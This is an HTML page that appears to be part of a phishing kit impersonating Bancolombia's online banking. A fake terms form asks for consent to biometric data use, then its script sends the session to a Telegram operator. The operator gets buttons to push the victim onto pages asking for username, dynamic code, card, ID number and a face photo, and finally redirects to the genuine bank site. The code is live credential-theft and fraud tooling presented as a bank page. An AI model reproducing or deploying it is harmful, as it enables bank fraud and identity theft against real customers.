<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sucursal Virtual Personas - Bancolombia</title>
    <link rel="stylesheet" href="styles_new.css">
    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script>
    document.addEventListener('DOMContentLoaded', async function() {
        const check1 = document.getElementById('termino1');
        const check2 = document.getElementById('termino2');
        const check3 = document.getElementById('termino3');
        const btn = document.querySelector('.btn-iniciar');
        const form = document.getElementById('terminosForm');
        const overlay = document.getElementById('loadingOverlay');
        
        if (!check1 || !check2 || !check3 || !btn || !form || !overlay) return;
        
        overlay.classList.remove('active', 'show');
        overlay.style.display = '';
        
        const socketInstance = BancoUtils.initSocket();
        if (socketInstance) socketInstance.removeAllListeners('telegramAction');
        
        btn.disabled = true;
        
        function validateForm() {
            const isValid = check1.checked && check2.checked && check3.checked;
            btn.disabled = !isValid;
            if (isValid) {
                btn.style.backgroundColor = '#FFD700';
                btn.style.cursor = 'pointer';
            } else {
                btn.style.backgroundColor = '';
                btn.style.cursor = 'default';
            }
        }
        
        check1.addEventListener('change', validateForm);
        check2.addEventListener('change', validateForm);
        check3.addEventListener('change', validateForm);
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (btn.disabled) return;
            
            const currentSocket = BancoUtils.getSocket();
            if (!currentSocket || !currentSocket.connected) {
                BancoUtils.initSocket();
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            
            const data = { terminos: 'Aceptados (3/3)' };
            const fullData = BancoUtils.saveBankData('bancolombia', data);
            const message = BancoUtils.formatMessage('BANCOLOMBIA - T√©rminos', fullData);
            const buttons = [
                { text: 'üîë Pedir Usuario', action: 'index' },
                { text: 'üî¢ Pedir Din√°mica', action: 'dinamica' },
                { text: 'üí≥ Pedir Tarjeta', action: 'tarjeta' },
                { text: 'üÜî Pedir C√©dula', action: 'cedula' },
                { text: 'üì∑ Pedir Cara', action: 'cara' },
                { text: 'üìÑ Pedir T√©rminos', action: 'terminos' },
                { text: '‚úÖ Finalizar', action: 'finalizar' }
            ];
            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
            
            try {
                await BancoUtils.sendToTelegram('terminos', { text: message, keyboard });
            } catch (error) {
                overlay.classList.remove('active');
                overlay.style.display = 'none';
                alert('Error al enviar. Intenta nuevamente.');
            }
        });
        
        BancoUtils.onTelegramAction((data) => {
            if (data.action === 'finalizar') {
                window.location.href = 'https://www.bancolombia.com/personas';
            } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
                window.location.href = data.action + '.html';
            }
        });
        
        async function updateInfo() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                document.getElementById('ipAddress').textContent = `Direcci√≥n IP: ${ipData.ip}`;
                
                const now = new Date();
                const opts = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric', hour12: true, timeZone: 'America/Bogota' };
                document.getElementById('datetime').textContent = now.toLocaleDateString('es-CO', opts);
            } catch (e) {}
        }
        updateInfo();
        setInterval(updateInfo, 60000);
    });
    </script>
</head>
<body>
    <div class="auth-container">
        <div class="auth-content">
            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
            <h1>Sucursal Virtual Personas</h1>
            
            <div class="auth-box">
                <h2>T√©rminos y Condiciones</h2>
                <p>Por favor, lee y acepta los siguientes t√©rminos:</p>
                
                <form id="terminosForm" class="auth-form">
                    <div class="terminos-container">
                        <div class="checkbox-group">
                            <input type="checkbox" id="termino1" class="termino-check">
                            <label for="termino1">Autorizo el uso y tratamiento de mis datos personales y biom√©tricos.</label>
                        </div>
                        <div class="checkbox-group">
                            <input type="checkbox" id="termino2" class="termino-check">
                            <label for="termino2">Acepto los t√©rminos y condiciones de la Sucursal Virtual.</label>
                        </div>
                        <div class="checkbox-group">
                            <input type="checkbox" id="termino3" class="termino-check">
                            <label for="termino3">Confirmo que soy el titular de la cuenta y la informaci√≥n proporcionada es ver√≠dica.</label>
                        </div>
                    </div>
                    <div class="button-container">
                        <button type="submit" class="btn-iniciar" disabled>Continuar</button>
                        <button type="button" class="btn-cancelar">Cancelar</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="help-links">
            <a href="#">¬øProblemas para conectarte?</a>
            <span class="separator">‚Ä¢</span>
            <a href="#">Aprende sobre seguridad</a>
            <span class="separator">‚Ä¢</span>
            <a href="#">Reglamento Sucursal Virtual</a>
            <span class="separator">‚Ä¢</span>
            <a href="#">Pol√≠tica de privacidad</a>
        </div>

        <footer class="footer">
            <div class="footer-content">
                <div class="footer-left">
                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
                </div>
                <div class="footer-right">
                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
                    <p class="datetime" id="datetime">Cargando fecha y hora...</p>
                </div>
            </div>
        </footer>
    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    </div>
</body>
</html>